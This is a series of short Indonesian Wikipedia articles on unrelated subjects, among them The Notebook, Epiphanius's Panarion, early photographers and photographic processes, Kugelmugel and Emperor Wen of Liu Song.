Pembelajaran dalam ranah kajian Kristen Yahudi berdasarkan pada konstruksi buatan yang mirip dengan karya-karya yang dikembangkan oleh para heresiologis gereja perdana, dengan asumsi bahwa semua keyakinan dan praktek dari kelompok-kelompok tersebut berdasarkan pada teologi. Ini berujung pada perpetuasi definisi ideologi yang gagal untuk mengambil catatan pluriformitas kelompok tersebut, merefleksikan perbedaan dalam geografi, periode waktu dalam sejarah, dan etnisitas. Terkait Epifanus, dan khususnya, orang Ebionit, kurang diberikan perhatian mengenai hakikat dari kontruksi-kontruksi teologinya yang sangat spekulatif dan perpaduannya dari sumber-sumber yang berbeda, termasuk pemakaian harmoni injil yang tak dilakukan sekte Ebionit yang dikenal oleh Irenaeus. Pada akhirnya, Epifanius memberikan gambaran enigmatik dari orang Ebionit dan tempat mereka dalam sejarah gereja perdana.






</doc>
<doc id="1753126" url="https://id.wikipedia.org/wiki?curid=1753126" title="The Notebook (film)">
The Notebook (film)

The Notebook adalah film drama romantis Amerika Serikat tahun 2004 yang disutradarai oleh Nick Cassavetes dan diproduseri oleh Lynn Harris dan Mark Johnson. Berdasarkan novel dengan judul yang sama karya Nicholas Sparks tahun 1996, film ini dibintangi oleh Ryan Gosling, Rachel McAdams, James Garner, Gena Rowlands, Joan Allen, dan James Marsden. The Notebook difilmkan di Charleston, Carolina Selatan.

Pada zaman modern, di sebuah panti jompo, seorang pria tua bernama Duke (James Garner) mulai membaca kisah romantis dari buku catatan (notebook) ke pasien wanita tua (Gena Rowlands).

Kisah yang Duke ceritakan dimulai pada tahun 1940 di Seabrook Island, Carolina Selatan. Seorang lelaki warga setempat Noah Calhoun (Ryan Gosling) jatuh cinta dengan ahli waris Allie Hamilton (Rachel McAdams), yang berusia 17 tahun, setelah melihatnya di karnaval, dan mereka berkencan di musim panas yang indah. Noah mengajak Allie ke sebuah rumah kosong, menjelaskan bahwa Noah ingin membeli rumah itu untuk mereka. Malam itu, Allie memintanya untuk bercinta, tetapi mereka terusik oleh sahabat Noah, Fin (Kevin Connolly), memberitahukan bahwa orang tua Allie memanggil polisi yang keluar untuk mencarinya.

Ketika Allie dan Noah kembali ke rumah orangtuanya, mereka melarangnya untuk menemui Noah. Dalam pertengkaran, ibu Allie, Ann (Joan Allen), menyebut Noah dengan sebutan "sampah" dan Noah mendengarnya secara tidak sengaja. Kecewa, ia berjalan keluar dan Allie mengejarnya. Akhirnya mereka putus dan keesokan harinya, Ann memberitahukan bahwa keluarganya kembali ke Charleston. Allie mencoba untuk menghubungi Noah, tetapi tidak dapat terhubung. Ia meminta Fin memberitahu Noah bahwa ia mencintainya sebelum melakukan perjalanan pulang. Ketika Noah mendapatkan pesan Allie, ia bergegas ke rumah Allie dan menemukan rumah itu kosong.

Noah dan Allie tidak punya pilihan lain selain melanjutkan hidup mereka. Noah menulis surat untuk Allie setiap hari selama setahun, tetapi tidak pernah menerima balasan dari Allie karena Ann menyembunyikan surat-surat dari Noah sebelum putrinya melihat surat-surat itu. Patah hati, Noah dan Fin mendaftarkan diri untuk berperang di Perang Dunia II. Fin terbunuh dalam pertempuran. Sementara itu, Allie menjadi relawan di sebuah rumah sakit untuk tentara yang terluka, di mana ia bertemu seorang petugas bernama Lon Hammond Jr (James Marsden), seorang pengacara muda yang tampan, kaya, menarik dan berasal dari Selatan. Kedua akhirnya bertunangan, untuk menyenangkan orang tua Allie, tetapi Allie melihat wajah Noah saat Lon meminta dia untuk menikah dengannya.

Ketika Noah pulang dari perang, ia menemukan ayahnya telah menjual rumah mereka sehingga Noah bisa membeli rumah kosong, memenuhi impian seumur hidupnya, untuk Allie, yang ia tidak pernah temui atau dengar selama beberapa tahun. Ketika Noah mengunjungi Charleston, ia melihat Allie dan Lon berciuman di sebuah restoran; Noah meyakinkan dirinya bahwa jika ia mengembalikan rumah itu, Allie akan kembali padanya. Kemudian, Allie terkejut ketika membaca koran bahwa Noah telah membangun rumah dengan spesifikasi yang dibuatnya tahun sebelumnya, dan ia mengunjunginya ke Seabrook.

Pada masa kini, terungkap bahwa wanita tua itu adalah Allie, yang menderita demensia, dan Duke adalah Noah, suaminya. Namun, Allie tidak mengenalinya atau ingat semua peristiwa yang Duke bacakan untuknya.

Kembali ke masa lalu, Allie kembali ke Seabrook untuk bertemu dengan Noah. Keduanya melanjutkan hubungan mereka dan bercinta. Di pagi hari, Ann muncul di depan pintu Noah, memperingatkan Allie bahwa Lon telah mengikutinya ke Seabrook. Ia memberikan Allie surat-surat yang Noah tulis untuknya dan mengungkapkan bahwa pada masa mudanya, Ann juga jatuh cinta dengan seorang pemuda kelas bawah dan Ann masih memikirkannya. Allie mengaku kepada Lon bahwa ia telah menghabiskan waktu bersama Noah. Lon kecewa, namun ia mengatakan bahwa ia masih mencintainya. Allie mengatakan kepadanya bahwa ia tahu bahwa ia harus dengan Lon, tapi ia tetap tegas.

Pada masa kini, ingatan Allie menjadi jernih dengan cepat. Ia ingat bahwa Duke menceritakan bagaimana mereka bertemu, bagaimana ia muncul di depan pintu Noah dengan barang-barang miliknya setelah meninggalkan Lon di hotel, dan ia tiba-tiba ingat masa lalunya. Pada awal demensia, ia menulis kisah cinta mereka di buku catatan dengan arahan Noah untuk "dibacakan kepadaku, dan aku akan kembali kepadamu". Tapi penyakit Allie segera kambuh, kehilangan kenangan Noah. Ia panik, tidak mengetahui siapa ia, dan harus dibius. Duke (yang sebenarnya Noah) dirawat di rumah sakit karena kemungkinan serangan jantung.

Ketika Duke keluar dari rumah sakit, ia mengunjungi Allie dan menemukan Allie berpikir jernih lagi. Allie bertanya kepada Duke, apa yang akan terjadi pada mereka ketika Allie benar-benar kehilangan ingatannya, dan Duke meyakinkannya bahwa ia tidak akan pernah meninggalkannya. Allie bertanya jika Duke berpikir cinta mereka satu sama lain cukup kuat untuk "membawa mereka pergi bersama-sama"; Duke menjawab bahwa ia berpikir cinta mereka bisa melakukan apa saja. Setelah masing-masing menyatakan bahwa mereka saling mencintai, mereka berdua segera tidur di tempat tidur Allie. Keesokan harinya, perawat menemukan mereka telah meninggal dengan tenang di tempat tidur bersama-sama.


Film "The Notebook" mendapatkan reaksi beragam dari kritikus film. Berdasarkan 154 kumpulan ulasan dari "Rotten Tomatoes", 52% dari kritikus film memberi review positif dengan nilai rata-rata 5,7/10. Pada "Metacritic", yang memberikan nilai rata-rata 100 untuk ulasan kritikus yang mainstream, film ini memegang nilai rata-rata 53 berdasarkan 34 ulasan, yang menunjukkan "ulasan beragam atau rata-rata".

Roger Ebert dari "Chicago Sun-Times" memuji film ini, memberikan tiga setengah dari empat bintang, menyebut fotografi yang "mencolok dalam kesempurnaan dan memiliki efek jenuh" dan menyatakan bahwa "para pemain film diberkati oleh persiapan yang baik". Peter Lowry dari "Film Threat" memberikan tiga setengah dari lima bintang, memuji penampilan Ryan Gosling dan Rachel McAdams, menulis bahwa Ryan Gosling dan terutama Rachel McAdams memberikan semua pertunjukkan dengan baik, melakukan kendali, mengambil apa yang tersisa dari film ini dan menyelesaikannya untuk penonton dengan beberapa adegan sentuhan yang tidak membuat mata kering di dalam rumah. Tentang film ini sendiri, ia menambahkan bahwa secara keseluruhan, "The Notebook" adalah sebuah film bagus yang mengejutkan, yang berhasil sukses di mana banyak film drama lainnya seperti percintaan gagal.

Stephen Holden dari "New York Times" memberikan review positif pada film ini, menyatakan bahwa "adegan antara kekasih muda menghadapi otoritas dewasa memiliki ketegangan yang sama dan menyembunyikan perasaan tak terkendali ketika Warren Beatty dan Natalie Wood muda membawa lebih dari 40 tahun yang lalu dalam memerankan film "Splendor in the Grass"". Ann Hornaday dari "The Washington Post" memberikan review positif pada film ini, memuji penampilan Ryan Gosling dan Rachel McAdams, menyatakan bahwa tak masalah jika Rachel McAdams dan Ryan Gosling tidak selama satu menit mengingatkan kembali ke Amerika tahun 1940, mereka berdua menarik. Ryan Gosling, yang menampilkan pertama kali debut yang tak tampak di layar pada film drama "The Believer" tahun 2001, sangat meyakinkan sebagai seorang pemuda mempesona yang menarik pertahanan terkuat seorang gadis. Tentang film ini, ia menambahkan bahwa film "The Notebook" menjadi film musim panas yang harus dilihat oleh penonton yang memiliki keinginan asmara besar dan melekat.

William Arnold dari "Seattle Post-Intelligencer" memuji penampilan Rachel McAdams tetapi mengecam penampilan Ryan Gosling, yang menyatakan bahwa Ryan Gosling "tidak memiliki kekuatan bintang atau chemistry dengan Rachel McAdams untuk berlabuh seperti adegan kecil di film "Gone with the Wind"". Ia juga menambahkan tentang film yang "tidak benar-benar melakukan tujuan tersendiri, terutama karena pemberian peran romantisnya tidak terlihat, itu tidak membuat kita jatuh cinta dengan kekasihnya". Wesley Morris dari "The Boston Globe" memberikan dua setengah bintang untuk film, memuji penampilan aktor dan aktrisnya, menulis tentang Rachel McAdams bahwa "ia berkomitmen untuk menjiwai cerita dan memerhatikan para aktor lain". Ia menambahkan tentang Ryan Gosling bahwa ia dapat memerankan sosiopat dan perenung yang kuat, dan ada alasan untuk berpikir sejak awal, bahwa Noah mungkin sama bebasnya, seperti ketika ia mengancam akan turun dari permainan roda ferris di festival jika Allie setuju untuk berkencan dengannya. Tentang film ini, ia menulis bahwa mengingat "bisnis romantis" yang relatif cerah dan menyenangkan, yang mendahuluinya, hal-hal yang lama tampaknya gelap, mengerikan, dan dipaksakan pada kita.

Jessica Winter dari "The Village Voice" memberikan ulasan beragam pada film ini, menyatakan bahwa di tengah-tengah naskah Jeremy Leven yang manis dan sulit, Gena Rowlands dan James Garner memunculkan kebahagiaan dan tak cacat, memberikan kredibilitas yang baik untuk adegan mereka bersama-sama, keduanya mengiris bersih melalui dialog kesedihan dan pertemuan, menempatkan teror dan kesedihan yang dibuat oleh pengkhianatan kejam dari pikiran yang gagal. Robert Koehler dari "Variety" memberikan ulasan beragam pada film ini, namun ia memuji penampilannya, menulis bahwa sebagai salah satu aktor muda yang paling menarik, Ryan Gosling memperluas jangkauan untuk asmara murni tanpa mengorbankan sedikit kualitas subversif alaminya, dan bahkan tampaknya nyaman terhadap ketampanannya dengan cara jantannya Amerika. Sorotannya adalah Rachel McAdams, melakukan peran yang berbeda dari peran wanita liar populer di "Mean Girls" yang sulit dikatakan bahwa peran itu sama, ia terampil dalam membawa beban emosional film ini dengan cara yang bebas dan mudah.

Pada bulan Juni 2010, "Entertainment Weekly" memasukkan karakter Allie dan Noah dalam daftar "100 Greatest Characters of the Last 20 Years". Kala itu film "The Notebook" ditempatkan dalam daftar "25 Sexiest Movies Ever". "Us Weekly" memasukkan film ini dalam daftar "30 Most Romantic Movies of All Time". "Boston.com" menempatkan film ini ke posisi tiga dalam "Top Romantic Movie". "Moviefone" memasukkan film ini dalam daftar "25 Best Romance Movies of All Time". "Marie Claire" menempatkan film dalam daftar "12 Most Romantic Movie Scenes of All Time". Pada tahun 2011, film ini termasuk film drama terbaik di televisi "ABC News" dan "People" spesial "Best in Film: The Greatest Movies of Our Time". Adegan Noah memanjat wahana ferris wheel karena ingin berkencan dengan Allie dimasukkan oleh "Total Film" dalam daftar "50 Most Romantic Movie Moments of All Time". Adegan ciuman di bawah hujan ditempatkan di posisi empat oleh "Total Film" dalam daftar "50 Best Movie Kisses".

"The Notebook" dirilis pada tanggal 25 Juni 2004 di Amerika Serikat dan Kanada dengan pendapatan kotor USD 13,464,745 di 2.303 bioskop pada pembukaan akhir pekan, menempati posisi keempat di box office. Film ini memperoleh total USD 115,603,229 di seluruh dunia, USD 81,001,787 di Kanada dan Amerika Serikat dan USD 34,601,442 di negara lain. Film ini adalah film drama romantis keempat belas dengan pendapatan tertinggi sepanjang masa.



</doc>
<doc id="1753127" url="https://id.wikipedia.org/wiki?curid=1753127" title="Achmad Subianto">
Achmad Subianto

Achmad Subianti (16 Agustus 1946) adalah seorang pakar dan praktisi ekonomi di Indonesia
Subianto


</doc>
<doc id="1753130" url="https://id.wikipedia.org/wiki?curid=1753130" title="Panarion">
Panarion

Panarion (bahasa Yunani: Πανάριον, "Kotak obat-obatan") adalah nama yang diberikan oleh terjemahan bahasa Latin dari abad ke-16 untuk suatu karya heresiologi Kristen awal yang berjudul "Adversus Haereses" (bahasa Latin untuk "Melawan Ajaran Sesat") yang merupakan karya terpenting oleh Epifanius dari Salamis (meninggal tahun 403 M). Naskah aslinya ditulis dalam bahasa Yunani Koine mulai tahun 374 atau 375, dan diterbitkan 3 tahun kemudian, sebagai suatu makalah mengenai ajaran sesat ("heresies"), dengan judul yang merujuk kepada teks itu berbunyi "kumpulan obat untuk melawan racun ajaran sesat" ("stock of remedies to offset the poisons of heresy"). Tulisan ini mengulas 80 sekte agamawi, baik kelompok terorganisasi maupun filsafat, dari zaman Adam sampai bagian akhir abad ke-4 Masehi, menjabarkan sejarah masing-masing dan membantah keyakinan-keyakinan mereka. "Panarion" merupkan sebuah sumber penting mengenai Injil Yahudi-Kristen, Injil orang Ebionit, dan Injil orang Ibrani.

Makalah ini dapat dikatakan merupakan kelanjutan dari ""Ancoratus"" (tahun 374), yang berbentuk surat kepada gereja di di Pamfilia, menggambarkan bagaimana "" gereja dapat melawan serangan angin dari ajaran sesat, dan menjadi "berjangkar" ("", "anchoratos"; "anchor"= jangkar), sehingga dipakai sebagai judul tulisan ini. "Ancoratus" juga memuat garis besar isi "Panarion" dalam teksnya.

Makalah ini dimulai dengan dua prakata ("proems"): daftar isi dan sebuah pemerian mengenai metode dan tujuan tulisan Epifanius. Karya ini dibagi atas 3 buku, dengan keseluruhan 7 volume. Diakhiri dengan apa yang dikenal sebagai "De Fide", suatu catatan singat mengenai Katolisisme.

Jumlah sekte yang dibahas dalam tulisan ini didasarkan pada Kitab Kidung Agung 6:8-9, yang dikutip dalam bahasa Ibrani aslinya di bawah ini, dengan terjemahan bahasa Inggris dari 1917, serta terjemahan bahasa Indonesia menurut Terjemahan Baru dari Lembaga Alkitab Indonesia 1974:

Epifanius menafsirkan 80 selir sebagai sekte-sekte, yang menggunakan nama Kristus tanpa benar-benar terikat dalam pernikahan; 60 permaisuri adalah jumlah keturunan dari Adam sampai ke Yesus; satu-satunya merpati adalah istri sejati, yaitu gereja; dan dara-dara tak terbilang banyaknya adalah semua filsafat yang tidak terkait dengan Kekristenan.
"Panarion" memberikan informasi sangat berharga mengenai sejarah agama pada abad ke-4, karena si pengarang menyertakan saduran dari naskah-naskah yang hanya ada padanya, juga karena ia menulis pengamatan pribadinya.
Epifanius juga menulis "Anacephalaeoses", sebagai sebuah "epitome", atau versi pendek, dari "Panarion". Augustinus menggunakannya sebagai dasar dari tulisannya, "Contra Omnes Haereses" (="Melawan semua ajaran sesat").

Teks aslinya ditulis dalam bahasa Yunani Koine. Tiga versi bahasa Latin diterbitkan pada abad ke-16 dan ke-17, dari penulis-penulis yang berfokus pada minat eklesiastikal. Sejak itu, para penulis lebih tertarik pada isi historis teks itu sendiri.

Sebuat terjemahan lengkap bahasa Rusia telah diterbitkan pada abad ke-19. Terjemahan sebagian muncul dalam bahasa Jerman dan bahasa Inggris (oleh Philip Amidon).

Terjemahan bahasa Inggris dari seluruh "Panarion" diterbitkan pada tahun 1987 (Buku I) dan 1993 (Buku II dan III), oleh Frank Williams. Ini didasarkan pada edisi Karl Holl, yang dirilis pada tahun 1915 (Buku I), 1922 (Buku II), dan 1933 (Buku III), seluruhnya 1500 halaman.




</doc>
<doc id="1753135" url="https://id.wikipedia.org/wiki?curid=1753135" title="Cetak blok kayu">
Cetak blok kayu

Cetak blok kayu adalah sebuah teknik untuk mencetak teks, gambar atau susunan yang sebagian besar digunakan di seluruh Asia Timur dan berasal dari China pada zaman dahulu sebagai metode mencetak di atas tekstil dan kemudian kertas. Sebagai sebuah metode mencetak di atas pakaian, contoh yang masih ada terawal dari China berasal dari tahun sebelum 220, dan cetak blok kayu masih menjadi metode mencetak buku dan teks lainnya serta gambar di Asia Timur sampai abad ke-19. "Ukiyo-e" afalah jenis yang paling dikenal dari cetak seni blok kayu Jepang.



</doc>
<doc id="1753138" url="https://id.wikipedia.org/wiki?curid=1753138" title="Hugues Krafft">
Hugues Krafft

Hugues Krafft (1853 – 1935) adalah seorang fotografer yang lahir di Paris. Ia menjelajahi seluruh dunia, dan mengunjungi Jepang pada 1882–1883. Ia meninggalkan sejumlah foto berkualitas pada masa itu.



</doc>
<doc id="1753141" url="https://id.wikipedia.org/wiki?curid=1753141" title="Adolfo Farsari">
Adolfo Farsari

Adolfo Farsari (11 Februari 1841 – 7 Februari 1898) adalah seorang fotografer Italia yang berbasis di Yokohama, Jepang. Setelah berkarier militer, termasuk bertugas di Perang Saudara Amerika, ia menjadi fotografer komersial dan wirausahawan yang berhasil.

Adolfo Farsari lahir di Vicenza, Lombardy-Venetia (kemudian bagian dari Kekaisaran Austria, sekarang di Italia). Ia memulai kariernya dalam militer Italia pada 1859 namun berpindah ke Amerika Serikat pada 1863


</doc>
<doc id="1753242" url="https://id.wikipedia.org/wiki?curid=1753242" title="Fotografi perang">
Fotografi perang

Fotografi perang menangkap foto-foto konflik bersenjata dan wilayah-wilayah yang terkena perang.

Meskipun foto dapat mewakili lebih langsung ketimbang lukisan atau gambar, foto-foto tersebut terkadang dimanipulasi sehingga membuat gambar tersebut menjadi tidak objektif secara jurnalistik.

Dengan penemuan fotografi pada 1830an, kemungkinan menangkap peristiwa-peristiwa perang untuk disebarkan ke publik pertama kali dieksplor.



</doc>
<doc id="1753308" url="https://id.wikipedia.org/wiki?curid=1753308" title="Proses kolodion">
Proses kolodion

Proses kolodion adalah sebuah proses fotografi awal, yang diciptakan oleh Frederick Scott Archer. Proses tersebut diperkenalkan pada 1850an pada akhir dekade tersebut, proses tersebut menggantikan proses fotografi praktikal pertama, daguereotipe.

Pada 1851, Frederick Scott Archer mengenalkan sebuah proses plat basah yang terkadang disebut sebagai proses kolodion setelah bahan carrier digunakan.



</doc>
<doc id="1753318" url="https://id.wikipedia.org/wiki?curid=1753318" title="Seni genre">
Seni genre

Seni genre adalah sebuah perwakilan gambaran dari berbagai media dari latar belakang atau peristiwa dari kehidupan sehari-hari, seperti pasar, setting domestik, interior, pesta, latar belakang penginapan, dan latar belakang jalanan. Perwakilan tersebut (juga disebut karya genre, latar belakang genre, atau pemandangan genre) bisa jadi adalah kenyataan atau diimajinasikan atau diromantisasikan oleh seniman. Beberapa variasi dari istilah "seni genre" berdasarkan pada medium atau jenis dari karya visual adalah "lukisan genre", "cetakan genre", "fotografi genre", dan lain-lain.
Pada abad kesembilan belas di Italia ingat khususnya dari eksponen terbesar genre lukisan Antonio Rotta dan Vincenzo Petrocelli.



</doc>
<doc id="1753320" url="https://id.wikipedia.org/wiki?curid=1753320" title="SMK Garuda Nusantara">
SMK Garuda Nusantara

Sekolah Menengah Kejuruan Garuda Nusantara adalah sekolah yang menyelenggarakan pendidikan kejuruan kelompok teknologi dan informasi, didirikan oleh Yayasan Pendidikan Nurul Huda.

Terdapat jurusan yang telah ada yaitu:


Website


</doc>
<doc id="1753329" url="https://id.wikipedia.org/wiki?curid=1753329" title="Ueno Hikoma">
Ueno Hikoma

Sejumlah anggota keluarganya merupakan seorang pembuat lukisan. Lebih lanjut, ia adalah putra dari Ueno Toshinojō (juga dikenal sebagai Ueno Shunnojō) (1790–1851), seorang pedagang yang bekerja dengan klan Shimazu yang pada 1848 membawa kamera pertama di negara tersebut, sebuah kamera daguereotipe untuk daimyō Shimazu, Nariakira.

Ueno Hikoma pertama kali mempelajari klasik Tionghoa; kemudian pada 1852, tak lama setelah kematian ayahnya, ia masuk Kolese Pengobatan Nagasaki dengan pandangan untuk mempelajari kimia dalam rangka membantu keluarganya menjalankan bisnis keluarganya

Ueno mendiri mengajar bebetapa fotografer abad kesembilanbelas yang berpengaruh, yakni Uchida Kuichi (1844–1875), Tomishige Rihei, Kameya Tokujirō, (1837–1922), Nakajima Shinzō, Nagai Nagayoshi, Noguchi Jōichi, Nakajima Seimin, Tanaka, Morita Raizō, Kikizu Maturoku, dan Ueno Yoshima.



</doc>
<doc id="1753332" url="https://id.wikipedia.org/wiki?curid=1753332" title="Lukisan pasir">
Lukisan pasir

Lukisan pasir adalah seni rupa dari pasir berwarna, pigmen berbentuk bubuk dari minerals atau kristal, dan pigmen-pigmen dari sumber alam atau sintesis lainnya.

Lukisan kering dipraktikkan oleh Amerika Asli di Barat Daya Amerika Serikat, oleh orang Tibet dan biksu Buddha, serta Aborigin Australia, dan juga oleh orang Amerika Latin pada hari raya Kristen.

Lukisan pasir Buddha Tibet terkadang mengkomposisikan "mandala". Di Tibetan, seni rupa tersebut disebut "dul-tson-kyil-khor" (mandala dari bubuk berwarna).



</doc>
<doc id="1753337" url="https://id.wikipedia.org/wiki?curid=1753337" title="Fihr bin Malik">
Fihr bin Malik

Fihr bin Malik (), atau julukannya Quraisy, adalah salah seorang nenek moyang Nabi Muhammad dan kabilah Quraisy lainnya. Nama lengkapnya adalah Fihr bin Malik bin An-Nadhr bin Kinanah, salah seorang kepala suku dari Bani Kinanah. Bani Kinanah adalah salah satu kabilah Bani Adnan yang merupakan keturunan dari Nabi Ismail. Fihr dan anak keturunannya menetap di kota Makkah, di wilayah Hijaz.

Fihr bin Malik memimpin penduduk Makkah untuk memerangi bala tentara bangsa Himyar ketika mereka datang untuk memindahkan Ka'bah ke Yaman, dan berhasil mengalahkan pasukan tersebut. Fihr bin Malik menggalang pasukan gabungan yang terdiri dari Quraisy, Bani Kinanah, Bani Khuzaimah, Bani Asad, Bani Judham, dan beberapa kabilah Mudhar. Raja Himyar Hassan bin Abdu Kalal bin Mathub bin Dzu Hurath al-Himyari berhasil ditawan, dan setelah tiga tahun baru dibebaskan setelah membayar uang tebusan.

Fihr bin Malik memperhatikan kebutuhan para peziarah haji yang datang ke Makkah, dan sebagai mata pencahariannya ia berdagang dengan kabilah bangsa Arab lainnya.

Dari pekawinan Fihr bin Malik dengan Layla binti Al-Harits bin Tamim bin Sa'ad bin Hudzail bin Mudrikah, ia mempunyai beberapa anak yang bernama Ghalib (yang juga mempunyai banyak keturunan), Muharib, dan Harits, Asad, Awf, Jawn, dan Dhi'b. Ketika Nabi Muhammad memulai penyebaran agama Islam, kabilah-kabilah besar Quraisy ("Imarah Quraisy") keturunan Fihr bin Malik yang saat itu menetap di Makkah dan sekitarnya, adalah:





</doc>
<doc id="1753338" url="https://id.wikipedia.org/wiki?curid=1753338" title="Charles Wirgman">
Charles Wirgman

Charles Wirgman (31 Agustus 1832 - 8 Februari 1891) adalah seorang seniman dan kartunis Inggris, pembuat dari "Japan Punch" dan ilustrator di China dan zaman Meiji Jepang untuk Illustrated London News.

Wirgman adalah putra sulung dari Ferdinand Charles Wirgman (1806-57) dan saudara dari Theodore Blake Wirgman. Ia menikah dengan Ozawa Kane pada 1863, dan pasangan tersebut memiliki satu putra.

Wirgman datang ke Jepang pada 1861 sebagai seorang koresponden untuk Illustrated London News, dan bermukim di Yokohama dari 1861 sampai kematiannya. Ia menerbitkan majalah pertama di Jepang, "Japan Punch", sebulan sekali antara 1862 dan musim semi 1887.


</doc>
<doc id="1753341" url="https://id.wikipedia.org/wiki?curid=1753341" title="Puteri Muslimah Indonesia">
Puteri Muslimah Indonesia

Puteri Muslimah Indonesia (disingkat PMI) adalah sebuah kontes kecantikan untuk wanita muslimah di seluruh Indonesia dan ditayangkan di Indosiar sejak tahun 2014 bersama produk kecantikan Wardah Cosmetics. Organisasi ini langsung ditangani oleh Elang Mahkota Teknologi dan Stream Entertainment sebagai management resmi. Pada tahun 2019 mereka yang terpilih akan bertanding mewakili Indonesia di ajang Puteri Muslimah Asia.

Selain sebagai wadah untuk menampung bakat dan prestasi, kontes kecantikan ini juga menginspirasi wanita muslimah di seluruh Indonesia. Kriteria penilaian untuk menjadi pemenang adalah Ahklak, Bakat, dan Cantik (ABC), selain itu juga bertugas untuk memberi bantuan dan santunan kepada anak yang kurang mampu dan beberapa kegiatan lainnya. Pemegang Mahkota Puteri Muslimah Indonesia saat ini adalah Nurul Bashirah dari Jawa Barat.

Karena antusiasme masyarakat terhadap Puteri Muslimah Indonesia yang besar, maka pada tahun 2018 Indosiar mengadakan kontes kecantikan dengan skala cakupan lebih besar yaitu Puteri Muslimah Asia.

Persyaratan bagi peserta pemilihan Puteri Muslimah Indonesia:



</doc>
<doc id="1753342" url="https://id.wikipedia.org/wiki?curid=1753342" title="Aktivis sosial">
Aktivis sosial

Aktivis sosial adalah istilah umum yang merujuk kepada kegiatan, baik yang dilakukan oleh perseorangan maupun lembaga swadaya masyarakat untuk memperjuangkan kepentingan masyarakat umum menuju kehidupan yang baik. Aktivis sosial merupakan pengabdi yang mengorbankan tenaga, pikiran, bahkan harta bendanya untuk mewujudkan cita-cita.



</doc>
<doc id="1753345" url="https://id.wikipedia.org/wiki?curid=1753345" title="Cetak albumen">
Cetak albumen

Cetak albumen, juga disebut cetak perak albumen, ditemukan pada 1850 oleh Louis Désiré Blanquart-Evrard, dan merupakan metode menghasilkan cetakan fotografi di atas kertas dari sebuah foto negatif yang diperdagangkan secara komersial. Pada pertengahan abad ke-19, carte de visite menjadi salah satu metode albumen yang digunakan yang paling populer. Pada abad ke-19, E. & H. T. Anthony & Company menjadi pasar dan distributor cetak foto albumen terbesar di Amerika Serikat.




</doc>
<doc id="1753351" url="https://id.wikipedia.org/wiki?curid=1753351" title="Wedding Crashers">
Wedding Crashers

Wedding Crashers adalah sebuah film komedi percintaan Amerika 2005 yang disutradarai oleh David Dobkin. Film tersebut dibintangi oleh Owen Wilson, Vince Vaughn, dan Christopher Walken. Will Ferrell juga membuat penampilan cameo yang terkenal. Film tersebut ditulis oleh Steve Faber dan Bob Fisher dan diproduksi New Line Cinema.

Film tersebut dibuka pada 15 Juli 2005. DVD-nya dirilis pada 3 Januari 2006, termasuk sebuah versi yang tak berating, dan versi Blu-ray-nya dirilis pada30 Desember 2008.

John Beckwith (Owen Wilson) dan Jeremy Grey (Vince Vaughn) adalah mediator perceraian di Washington D.C. Keduanya memutuskan untuk "menghancurkan" pesta-pesta perkawinan untuk bertemu dan meniduri wanita


Film tersebut ditulis oleh Steve Faber dan Bob Fisher dan diproduksi oleh New Line Cinema, dengan pengambilan gambar dilakukan di Washington, D.C. dan Pesisir Timur Maryland.
Fotografi prinsipal-nya dimulai pada 22 Maret 2004 dan film tersebut memiliki jadwal pengambilan gambar 52 hari.

Pembuat film tersebut membuat sebuah versi TV realitas, yang bernama "The Real Wedding Crashers" dan ditayangkan di NBC pada April dan Mei 2007. NBC hanya menampilkan empat episode.



</doc>
<doc id="1753352" url="https://id.wikipedia.org/wiki?curid=1753352" title="SMK Mitra Industri">
SMK Mitra Industri

Sekolah Menengah Kejuruan Mitra Industri adalah sekolah yang menyelenggarakan pendidikan kejuruan kelompok Industri. Didirikan pada tanggal 16 Febuari 2011 di atas lahan 9 Ha. Sekolah ini dalam naungan Yayasan Mitra Industri Mandiri

Terdapat jurusan yang telah ada yaitu:


Website


</doc>
<doc id="1753355" url="https://id.wikipedia.org/wiki?curid=1753355" title="Baron Yusuf Siregar">
Baron Yusuf Siregar

Baron Wilschut () adalah aktor berkebangsaan Indonesia. Ia pertama kali bermain dalam sinetron "Sissy Putri Duyung" & "Ronaldowati". Namanya semakin meroket semenjak dia bermain dalam sinetron "Tendangan Si Madun", "Tendangan Si Madun 1", "Tendangan Si Madun 2", "Tendangan Si Madun 3", "Tendangan Si Madun Returns" dan "Madun", dengan peran tetap sebagai Martin dengan peran antagonis dengan peran protagonisnya yang dimainkan oleh Yusuf Mahardika (Madun).




</doc>
<doc id="1753356" url="https://id.wikipedia.org/wiki?curid=1753356" title="Kugelmugel">
Kugelmugel

Kugelmugel adalah bekas negara mikro yang terletak di Wina, Austria.

Terletak di Wina , "'Republik Kugelmugel' " menyatakan kemerdekaan pada tahun 1984, setelah perselisihan antara artis, Edwin Lipburger dan otoritas Austria terhadap izin bangunan rumah berbentuk bola yang dibangun di pedesaan di Lower Austria dan dipindahkan ke taman oleh otoritas. Rumah ini tertutup oleh pagar kawat berduri dan merupakan satu-satunya alamat dalam Republik diproklamasikan. Alamatnya adalah "2, Antifaschismusplatz 1" (2 Wina (Leopoldstadt), "Anti-Fasisme Square," No 1), .Lipburger menolak untuk membayar pajak kepada pemerintah Austria dan mulai mencetak perangko nya sendiri dan dia menerima hukuman penjara di pengadilan. Hanya grasi oleh Presiden Austria yang menyelamatkan dia bebas dari penjara.

Pemerintah negara Austria memindahkan struktur bangunan tersebut ke taman Prater dan dikelilingi dengan pagar kawat berduri.

Kugelmugel telah menjadi daya tarik wisata di Wina karena sejarahnya dan arsitektur bangunannya yang unik. Kata "Kugel" berarti "bola" (dalam bahasa Jerman); kata "Mugel" adalah ekspresi untuk "benjolan" atau "maestro".

Dia adalah seorang pria muda pencinta seni, dengan rambut putih yang dikepang kembar panjang dengan mata ungu. Dia dan Ladonia adalah karakter terpendek saat ini, selain dari Chibitalia cor.


</doc>
<doc id="1753371" url="https://id.wikipedia.org/wiki?curid=1753371" title="Liu Yilong">
Liu Yilong

Kaisar Wen dari Liu Song ((劉)宋文帝, (Liu) Song Wen-di) (407–453), nama pribadi Liu Yilong (劉義隆), alias Che'er (車兒), merupakan seorang Kaisar Tiongkok Dinasti Liu Song. Ia merupakan putra ketiga pelopor dinasti Kaisar Wu. Setelah kematian ayahandanya pada tahun 422, kakanda sulung Liu Yilong, Liu Yifu naik takhta sebagai Kaisar Shao. Pada tahun 424 sekelompok pejabat berpendapat bahwa Kaisar Shao tidak pantas menjadi kaisar kemudian memecat Kaisar Shao dan menempatkan Liu Yilong ke atas takhta sebagai Kaisar Wen.

